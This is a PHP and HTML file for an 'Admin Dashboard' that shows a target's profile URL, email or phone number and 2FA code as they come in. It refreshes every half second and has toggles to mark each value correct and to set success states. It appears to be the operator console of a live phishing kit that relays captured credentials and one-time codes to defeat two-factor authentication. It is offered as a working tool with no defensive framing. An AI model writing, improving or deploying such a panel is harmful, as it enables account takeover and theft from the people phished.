<?php
if (
    $_SERVER["REQUEST_METHOD"] == "POST" &&
    isset($_POST["action"]) &&
    $_POST["action"] == "update"
) {
    $correct_url_profile = isset($_POST["correct_url_profile"])
        ? $_POST["correct_url_profile"]
        : false;
    $correct_email_or_phone_number = isset(
        $_POST["correct_email_or_phone_number"]
        )
        ? $_POST["correct_email_or_phone_number"]
        : false;
    $correct_2fa_code = isset($_POST["correct_2fa_code"])
        ? $_POST["correct_2fa_code"]
        : false;
    $status_681 = isset($_POST["status_681"]) ? $_POST["status_681"] : false;
    $status_success = isset($_POST["status_success"])
        ? $_POST["status_success"]
        : false;
    $url_profile = isset($_POST["url_profile"]) ? $_POST["url_profile"] : "";
    $email = isset($_POST["email"]) ? $_POST["email"] : "";
    $twofa_code = isset($_POST["twofa_code"]) ? $_POST["twofa_code"] : "";
    $data = [
        "correct_url_profile" => $correct_url_profile,
        "correct_email_or_phone_number" => $correct_email_or_phone_number,
        "correct_2fa_code" => $correct_2fa_code,
        "status_681" => $status_681,
        "status_success" => $status_success,
        "url_profile" => $url_profile,
        "email" => $email,
        "twofa_code" => $twofa_code,
    ];
    $json_data = json_encode($data, JSON_PRETTY_PRINT);
    file_put_contents("data.json", $json_data);
    echo json_encode(["message" => "Data updated successfully."]);
    exit();
}
$json_data = file_exists("data.json")
    ? file_get_contents("data.json")
    : '{"correct_url_profile":false,"correct_email_or_phone_number":false,"correct_2fa_code":false,"status_681":false,"status_success":false,"url_profile":"","email":"","twofa_code":""}';
$data = json_decode($json_data, true);
?>

<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Dashboard</title>
        <link rel="stylesheet" href="admin.css">
    </head>

    <body>

        <div class="container">
        <h1>Admin Dashboard</h1>

            <label class='labelbox'>
                <div class="labelboxtext">
                    <p>URL Profile:</p>
                </div>
                <input type="text" id="url_profile" value="<?php echo $data[
                    "url_profile"
                ]; ?>" readonly>
                <label class="switch">
                    <input type="checkbox" id="correct_url_profile" <?php echo isset(
                        $data["correct_url_profile"]
                        ) && $data["correct_url_profile"]
                        ? "checked"
                        : ""; ?> onclick="saveData()">
                    <span class="slider round"></span>
                </label>
            </label><br>
            <label class='labelbox'>
                <div class="labelboxtext"><p>Email:</p></div>
                <input type="text" id="email" value="<?php echo $data["email"]; ?>" readonly>
                <label class="switch">
                    <input type="checkbox" id="correct_email_or_phone_number" <?php echo isset(
                        $data["correct_email_or_phone_number"]
                        ) && $data["correct_email_or_phone_number"]
                        ? "checked"
                        : ""; ?> onclick="saveData()">
                    <span class="slider round"></span>
                </label>
            </label><br>
            <label class='labelbox'>
                <div class="labelboxtext"><p>2FA Code:</p></div>
                <input type="text" id="twofa_code" value="<?php echo $data[
                    "twofa_code"
                ]; ?>" readonly>
                <label class="switch">
                    <input type="checkbox" id="correct_2fa_code" <?php echo isset(
                        $data["correct_2fa_code"]
                        ) && $data["correct_2fa_code"]
                        ? "checked"
                        : ""; ?> onclick="saveData()">
                    <span class="slider round"></span>
                </label>
            </label><br>
            <label class='labelbox'>
                <div class="labelboxtext"><p>Status 681:</p></div>
                <label class="switch">
                    <input type="checkbox" id="status_681" <?php echo isset(
                        $data["status_681"]
                        ) && $data["status_681"]
                        ? "checked"
                        : ""; ?> onclick="saveData()">
                    <span class="slider round"></span>
                </label>
            </label><br>
            <label class='labelbox'>
                <div class="labelboxtext"><p>Status Success:</p></div>
                <label class="switch">
                    <input type="checkbox" id="status_success" <?php echo isset(
                        $data["status_success"]
                        ) && $data["status_success"]
                        ? "checked"
                        : ""; ?> onclick="saveData()">
                    <span class="slider round"></span>
                </label>
            </label>
        </div>

        <script>
            function saveData() {
                var data = {
                    action: 'update',
                    correct_url_profile: document.getElementById('correct_url_profile').checked,
                    correct_email_or_phone_number: document.getElementById('correct_email_or_phone_number').checked,
                    correct_2fa_code: document.getElementById('correct_2fa_code').checked,
                    status_681: document.getElementById('status_681').checked,
                    status_success: document.getElementById('status_success').checked,
                    url_profile: document.getElementById('url_profile').value,
                    email: document.getElementById('email').value,
                    twofa_code: document.getElementById('twofa_code').value
                };

                var xhr = new XMLHttpRequest();
                xhr.open('POST', '<?php echo $_SERVER["PHP_SELF"]; ?>', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        var response = JSON.parse(xhr.responseText);
                    }
                };
                xhr.send('action=' + encodeURIComponent(data.action) + '&correct_url_profile=' + encodeURIComponent(data.correct_url_profile) + '&correct_email_or_phone_number=' + encodeURIComponent(data.correct_email_or_phone_number) + '&correct_2fa_code=' + encodeURIComponent(data.correct_2fa_code) + '&status_681=' + encodeURIComponent(data.status_681) + '&status_success=' + encodeURIComponent(data.status_success) + '&url_profile=' + encodeURIComponent(data.url_profile) + '&email=' + encodeURIComponent(data.email) + '&twofa_code=' + encodeURIComponent(data.twofa_code));
            }
            function updateDataFromJSON() {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'data.json', true);
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        var newData = JSON.parse(xhr.responseText);
                        document.getElementById('url_profile').value = newData.url_profile;
                        document.getElementById('email').value = newData.email;
                        document.getElementById('twofa_code').value = newData.twofa_code;
                    }
                };
                xhr.send();
            }
            setInterval(updateDataFromJSON, 500);
        </script>
    </body>

</html>